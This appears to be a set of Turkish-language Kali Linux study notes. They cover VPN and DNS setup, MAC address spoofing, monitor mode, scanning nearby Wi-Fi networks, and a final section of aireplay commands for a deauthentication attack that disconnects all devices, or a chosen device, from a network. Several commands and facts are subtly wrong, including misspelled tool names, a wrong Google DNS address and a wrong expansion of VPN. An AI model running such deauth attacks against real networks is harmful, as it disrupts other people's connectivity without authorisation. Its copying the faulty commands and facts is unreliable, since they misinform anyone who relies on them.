# Cyber Security
- [1-VPN DNS MAC](#1-VPN-DNS-MAC)
- [2-Monitör Mod ve Manage Mod](#2-Monitör-Mod-ve-Manage-Mod)
- [3-Çevredeki Modemleri Bulma](#3-Çevredeki-Modemleri-Bulma)
- [4-Deauth Saldırısı Yapma](#4-Deauth-Saldırısı-Yapma)
  - [Ağdaki Cihazların MAC Adreslerini Görme](#Ağdaki-Cihazların-MAC-Adreslerini-Görme)
  - [Ağdaki Cihazlara Deauth Saldırısı Yapma](#Ağdaki-Cihazlara-Deauth-Saldırısı-Yapma)
    - [Ağdaki Bütün Cihazlara Saldırı](#Ağdaki-Bütün-Cihazlara-Saldırı)
    - [Ağdaki Belirli Cihaza Saldırı](#Ağdaki-Belirli-Cihaza-Saldırı)




# 1-VPN DNS MAC 

VPN (Virtual Personal Network)

DNS (Domain Name Server)

```iwconfig``` -> bağlı olduğumuz wifi ile ilgili bilgileri detaylı olarak gösterir

### VPN BOOK

```wwww.vpnbook.com``` kali içine VPN indirmemizi sağlar

```openvpn vpnadı``` -> vpn dosyasını açar

```service network-manager restart``` -> internet sunucularını resetler

### Kali DNS Ayarları Değiştirme

```nano /etc/dhcp/dhclient.conf``` içindeki ```prepentt name servers ```değiştirmemiz gerekir

Google DNS-> 8.8.8.8 ya da 8.4.4.8
Cloudflare -> 1.1.1.1. ya da 1.0.0.1

### DNS sızıntı testi için

www..dnsleaktest.com

### MAC Adresi Değiştirme

> ### 1.Yöntem

```macchanger```ile mac adresimizi değiştirebiliriz ya da
> ### 2.Yöntem
```
ifconfig wlan0 down

ifconfig wlan hw ether XX:XX:XX:XX:XX:XX  İstediğimiz MAC adresini yapmamızı sağlar

ifconfig wlan0 up
```

# 2-Monitör Mod ve Manage Mod

- wifi adaptörümüzü bilgisayarımıza bağlıyoruz, daha sonra kalimizi monitör moda almamız gerekiyor

> ### 1.Yöntem

```airmon -ng start wlan0```-> interneti monitör moda alır !! Monitör modda iken internete bağlanamayız sadece bağlı olmadığımız ağların bilgilerini elde edebiliriz

```airmon -ng stop wlan0``` -> interneti manage moda alır 

> ### 2.Yöntem
```
ifconfig wlan0 down

ifconfig wlan0 mode monitor

ifconfig wlan0 up
```

# 3-Çevredeki Modemleri Bulma

```airopdump -ng wlan0mon``` -> Çevredeki Modemleri Bulur

```CTRL + X ile işlemi sonlandırırız```

```
* pwr -> - Olarak ne kadar büyükse modem bize o kadar yakındır
* Data -> O ağa kaç cihazın bağlı olduğunu gösterir
* CH -> Hangi kanalda olduğunu gösterir
* ENC -> Şifreleme işlemi bilgisi
```

# 4-Deauth Saldırısı Yapma

### Ağdaki Cihazların MAC Adreslerini Görme
```
airodump -ng --channel X (kanal numarası) --bssid XX:XX:XX:XX:XX:XX (MAC adresi) --write airodumptest (Sonuçları yazdıracağımız 
dosya adı) wlan0
```
### Ağdaki Cihazlara Deauth Saldırısı Yapma
> ### Ağdaki Bütün Cihazlara Saldırı
```
aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX wlan0mon
```

> ### Ağdaki Belirli Cihaza Saldırı
```
aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
```

```
* A: Gönderilecek paket sayısı, sayı büyüdükçe ağda düşme süresi artar
* -a:  Ağın MAC adresi
* -c:  Saldırı Yapılacak Cihazın MAC adresi
```
